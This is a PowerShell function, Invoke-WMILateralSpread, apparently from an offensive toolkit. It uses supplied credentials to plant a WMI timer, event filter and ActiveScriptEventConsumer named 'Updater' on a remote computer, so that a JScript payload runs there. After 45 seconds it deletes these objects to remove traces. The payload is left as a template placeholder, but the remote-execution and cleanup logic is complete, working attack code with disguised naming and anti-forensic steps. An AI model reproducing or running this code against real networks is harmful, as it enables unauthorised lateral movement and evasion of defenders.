function Invoke-WMILateralSpread {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = '.',

        [ValidatePattern('.*\.*')]
        [String]
        $UserName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Password,

        [ValidateNotNullOrEmpty()]
        [String]
        $SpawnProcess = "rundll32.exe"
    )


    if ($PSBoundParameters['UserName']) {
        $SecPassword = ConvertTo-SecureString $PSBoundParameters['Password'] -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential($PSBoundParameters['UserName'], $SecPassword)
    }

    # set up a 30 second timer
    $TimerArg = @{
        IntervalBetweenEvents = ([UInt32] 30000)
        SkipIfPassed = $False
        TimerId = 'Timer'
    }

    $Arguments = @{
        Namespace = 'ROOT\cimv2'
        Class = '__IntervalTimerInstruction'
        ComputerName = $ComputerName
        Arguments = $TimerArg
        ErrorAction = 'Stop'
    }

    if ($Credential) { $Arguments['Credential'] = $Credential }
    Write-Verbose "Installing timer with name 'Timer' on $ComputerName"
    $Timer = Set-WmiInstance @Arguments


    # set up the timer filter
    $Trigger = @{
        Name = 'Updater'
        EventNameSpace = 'ROOT\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'"
    }

    $FilterParams = @{
        Namespace = 'root\subscription'
        Class = '__EventFilter'
        ComputerName = $ComputerName
        Arguments = $Trigger
        ErrorAction = 'Stop'
    }

    if ($Credential) { $FilterParams['Credential'] = $Credential }
    Write-Verbose "Installing event filter 'Updater' for the timer on $ComputerName"
    $Filter = Set-WmiInstance @FilterParams


    # the actual payload used
    $JScript = @"
JSCRIPT_FORMATTED_TEMPLATE_HERE
"@

    $Action = @{
        Name = 'Updater'
        ScriptingEngine = 'JScript'
        ScriptText = $JScript
        KillTimeout = [UInt32] 45
    }

    $ConsumerParams = @{
        Namespace = 'root\subscription'
        Class = 'ActiveScriptEventConsumer'
        ComputerName = $ComputerName
        Arguments = $Action
        ErrorAction = 'Stop'
    }

    if ($Credential) { $ConsumerParams['Credential'] = $Credential }
    Write-Verbose "Installing event consumer 'Updater' on $ComputerName"
    $Consumer = Set-WmiInstance @ConsumerParams


    # bind it all together
    $BindingParams = @{
        Namespace = 'root\subscription'
        Class = '__FilterToConsumerBinding'
        ComputerName = $ComputerName
        Arguments = @{ Filter = $Filter; Consumer = $Consumer }
        ErrorAction = 'Stop'
    }

    if ($Credential) { $BindingParams['Credential'] = $Credential }
    Write-Verbose "Installing filter to consumer binding on $ComputerName"
    $FilterConsumerBinding = Set-WmiInstance @BindingParams

    $Result = New-Object PSObject -Property @{
        Filter = $Filter
        Consumer = $Consumer
        Binding = $FilterConsumerBinding
    }


    Write-Verbose "Waiting 45 seconds for event to trigger on $ComputerName ..."
    Start-Sleep -Seconds 45


    $CleanupParams = @{
        ComputerName = $ComputerName
    }
    if ($Credential) { $CleanupParams['Credential'] = $Credential }
    Write-Verbose "Removing 'Timer' internal timer from $ComputerName"
    Get-WMIObject -Namespace root\cimv2 -Class __IntervalTimerInstruction @CleanupParams | ?{$_.TimerId -match 'Timer'} | Remove-WMIObject

    Write-Verbose "Removing filter to consumer binding from $ComputerName"
    Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding @CleanupParams | ?{$_.Filter -match 'Updater'} | Remove-WMIObject

    Write-Verbose "Removing event filter from $ComputerName"
    Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name LIKE 'Updater'" @CleanupParams | Remove-WMIObject

    Write-Verbose "Removing event consumer from $ComputerName"
    Get-WMIObject -Namespace root\Subscription -Class __EventConsumer @CleanupParams | ?{$_.Name -match 'Updater'} | Remove-WMIObject

    Write-Verbose "Cleanup completed on $ComputerName"
}
